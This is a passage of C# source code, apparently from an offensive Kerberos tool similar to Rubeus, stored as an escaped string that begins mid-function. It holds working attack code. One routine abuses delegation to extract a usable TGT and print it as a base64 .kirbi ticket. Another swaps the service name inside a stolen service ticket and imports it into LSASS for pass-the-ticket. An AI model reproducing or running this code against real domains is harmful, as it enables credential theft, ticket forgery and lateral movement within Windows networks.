cred.tickets.Add(ticket);\n                                                                }\n                                                                else if (elt3.TagValue == 3)\n                                                                {\n                                                                    var enc_part = elt3.Sub[0].Sub[1].GetOctetString();\n\n                                                                    // KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART = 14\n                                                                    var rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);\n\n                                                                    // decode the decrypted plaintext enc par and add it to our final cred object\n                                                                    var encKrbCredPartAsn = AsnElt.Decode(rawBytes2, false);\n                                                                    cred.enc_part.ticket_info.Add(new KrbCredInfo(encKrbCredPartAsn.Sub[0].Sub[0].Sub[0].Sub[0]));\n                                                                }\n                                                            }\n\n                                                            var kirbiBytes = cred.Encode().Encode();\n                                                            var kirbiString = Convert.ToBase64String(kirbiBytes);\n\n                                                            if (display)\n                                                            {\n                                                                Console.WriteLine("[*] base64(ticket.kirbi):\\r\\n", kirbiString);\n\n                                                                if (false)\n                                                                {\n                                                                    // display the .kirbi base64, columns of 80 chararacters\n                                                                    foreach (var line in Helpers.Split(kirbiString, 80))\n                                                                    {\n                                                                        Console.WriteLine("      {0}", line);\n                                                                    }\n                                                                }\n                                                                else\n                                                                {\n                                                                    Console.WriteLine("      {0}", kirbiString);\n                                                                }\n                                                            }\n\n                                                            finalTGTBytes = kirbiBytes;\n                                                        }\n                                                    }\n                                                    else\n                                                    {\n                                                        Console.WriteLine("[X] Error: Invalid checksum type: {0}", cksumtype);\n                                                    }\n                                                }\n                                            }\n                                        }\n                                        else\n                                        {\n                                            Console.WriteLine("[X] Error: Unable to extract session key from cache for target SPN: {0}", targetSPN);\n                                        }\n                                    }\n                                }\n                            }\n                            else\n                            {\n                                Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");\n                            }\n                        }\n                        else\n                        {\n                            Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");\n                        }\n                    }\n                    else\n                    {\n                        Console.WriteLine("[X] Error: Client is not allowed to delegate to target: {0}", targetSPN);\n                    }\n                }\n                else\n                {\n                    Console.WriteLine("[X] Error: InitializeSecurityContext error: {0}", status2);\n                }\n                // cleanup 1\n                Interop.DeleteSecurityContext(ref ClientContext);\n            }\n            else\n            {\n                Console.WriteLine("[X] Error: AcquireCredentialsHandle error: {0}", status);\n            }\n\n            // cleanup 2\n            Interop.FreeCredentialsHandle(ref phCredential);\n            return finalTGTBytes;\n        }\n\n        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, LUID luid = new LUID())\n        {\n            // subtitutes in an alternate servicename (sname) into a supplied service ticket\n\n            Console.WriteLine("[*] Substituting in alternate service name: {0}", altsname);\n\n            var name_string = new List<string>();\n            var parts = altsname.Split(\'/\');\n            if (parts.Length == 1)\n            {\n                // sname alone\n                kirbi.tickets[0].sname.name_string[0] = parts[0]; // ticket itself\n                kirbi.enc_part.ticket_info[0].sname.name_string[0] = parts[0]; // enc_part of the .kirbi\n            }\n            else if (parts.Length == 2)\n            {\n                name_string.Add(parts[0]);\n                name_string.Add(parts[1]);\n\n                kirbi.tickets[0].sname.name_string = name_string; // ticket itself\n                kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi\n            }\n\n            var kirbiBytes = kirbi.Encode().Encode();\n\n            LSA.DisplayTicket(kirbi, 2, false, true);\n\n            // TODO: check this code!\n\n            //var kirbiString = Convert.ToBase64String(kirbiBytes);\n\n            //Console.WriteLine("[*] base64(ticket.kirbi):\\r\\n", kirbiString);\n\n            //// display the .kirbi base64, columns of 80 chararacters\n            //foreach (var line in Helpers.Split(kirbiString, 80))\n            //{\n            //    Console.WriteLine("      {0}", line);\n            //}\n\n            //DisplayTicket(kirbi, false);\n\n            if (ptt || ((ulong)luid != 0))\n            {\n                // pass-the-ticket -> import into LSASS\n                LSA.ImportTicket(kirbiBytes, luid);\n            }\n        }\n\n        #endregion\n    }\n}\n'